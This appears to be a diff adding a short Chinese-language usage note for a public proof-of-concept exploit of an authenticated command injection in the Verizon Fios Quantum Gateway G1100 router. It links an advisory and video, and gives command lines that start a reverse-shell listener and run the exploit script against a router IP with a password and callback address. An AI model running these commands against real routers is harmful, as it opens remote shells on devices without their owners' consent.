@@ -1,0 +1,8 @@
+验证方式：验证文章
+文章链接：https://medium.com/tenable-techblog/verizon-fios-router-authenticated-command-injection-f6d2ddec30fd
+视频链接：https://youtu.be/gSEthjPoELk
+目标产品：Verizon Fios Quantum Gateway (G1100)
+
+poc用法：
+everseTcpShell 192.168.1.191 4444 
+python verizon_g1100_cmd_injection.py -t 192.168.1.1 -pw $password -ip 192.168.1.191 -ship 192.168.1.191
